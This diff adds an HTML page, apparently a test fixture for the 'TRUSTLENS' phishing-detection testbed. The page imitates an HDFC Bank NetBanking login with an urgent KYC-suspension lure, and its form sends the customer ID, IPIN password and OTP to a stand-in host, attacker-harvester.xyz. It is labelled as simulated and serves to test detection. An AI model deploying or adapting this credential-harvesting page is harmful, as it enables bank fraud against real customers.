@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en" data-trustlens-mock-url="https://fake-hdfc-netbanking.xyz/login">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HDFC Bank NetBanking Portal - Urgent KYC Verification Required</title>
+  <meta name="description" content="Official HDFC Bank NetBanking Login and Security Portal.">
+  <meta property="og:site_name" content="HDFC Bank">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BankOrCreditUnion",
+    "name": "HDFC Bank",
+    "url": "https://hdfcbank.com"
+  }
+  </script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1c1e21;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 24px;
+    }
+    .top-bar {
+      width: 100%;
+      max-width: 520px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    .brand-logo {
+      font-size: 20px;
+      font-weight: 800;
+      color: #004c8f;
+      letter-spacing: -0.5px;
+    }
+    .demo-tag {
+      font-size: 11px;
+      background: #fee2e2;
+      color: #b91c1c;
+      padding: 4px 8px;
+      border-radius: 999px;
+      font-weight: 600;
+      border: 1px solid #fecaca;
+    }
+    .card {
+      background: #ffffff;
+      width: 100%;
+      max-width: 520px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+      border: 1px solid #e2e8f0;
+      overflow: hidden;
+    }
+    .alert-banner {
+      background: #fef2f2;
+      border-bottom: 1px solid #fecaca;
+      padding: 16px 20px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .alert-icon { font-size: 20px; line-height: 1; }
+    .alert-text h4 { font-size: 13px; font-weight: 700; color: #991b1b; margin-bottom: 2px; }
+    .alert-text p { font-size: 12px; color: #b91c1c; line-height: 1.4; }
+    .card-body { padding: 28px 24px; }
+    h2 { font-size: 18px; font-weight: 700; color: #0f172a; margin-bottom: 8px; }
+    p.subtitle { font-size: 13px; color: #64748b; margin-bottom: 24px; }
+    .form-group { margin-bottom: 18px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: #334155; margin-bottom: 6px; }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #cbd5e1;
+      border-radius: 10px;
+      font-size: 14px;
+      outline: none;
+      transition: border 0.2s;
+    }
+    input:focus { border-color: #004c8f; box-shadow: 0 0 0 3px rgba(0, 76, 143, 0.12); }
+    .btn-submit {
+      width: 100%;
+      background: #004c8f;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn-submit:hover { background: #003768; }
+    .footer-notes {
+      margin-top: 24px;
+      font-size: 11px;
+      color: #94a3b8;
+      text-align: center;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="top-bar">
+    <div class="brand-logo">HDFC BANK</div>
+    <div class="demo-tag">SIMULATED PHISHING VECTOR</div>
+  </div>
+
+  <div class="card">
+    <div class="alert-banner">
+      <div class="alert-icon">⚠️</div>
+      <div class="alert-text">
+        <h4>URGENT: MANDATORY ACTION REQUIRED</h4>
+        <p>Your NetBanking account will be permanently blocked within 24 hours due to pending KYC verification. Confirm your credentials below.</p>
+      </div>
+    </div>
+
+    <div class="card-body">
+      <h2>Welcome to NetBanking</h2>
+      <p class="subtitle">Please enter your Customer ID and IPIN password to verify identity</p>
+
+      <!-- Deceptive Cross-Domain Exfiltration Target -->
+      <form action="https://attacker-harvester.xyz/collect" method="POST">
+        <div class="form-group">
+          <label for="cust_id">Customer ID / User ID</label>
+          <input type="text" id="cust_id" name="username" placeholder="e.g. 10293847" required>
+        </div>
+
+        <div class="form-group">
+          <label for="cust_pass">IPIN (Password)</label>
+          <input type="password" id="cust_pass" name="password" placeholder="Enter your secret IPIN" required>
+        </div>
+
+        <div class="form-group">
+          <label for="otp_code">SMS One-Time Password (OTP)</label>
+          <input type="text" id="otp_code" name="otp_code" placeholder="Enter 6-digit OTP sent to mobile" autocomplete="one-time-code" required>
+        </div>
+
+        <button type="submit" class="btn-submit">Verify Account & Cancel Suspension</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer-notes">
+    TRUSTLENS Security Testbed • Simulates Combosquatting on .xyz with Credential & OTP Harvesting Form
+  </div>
+</body>
+</html>
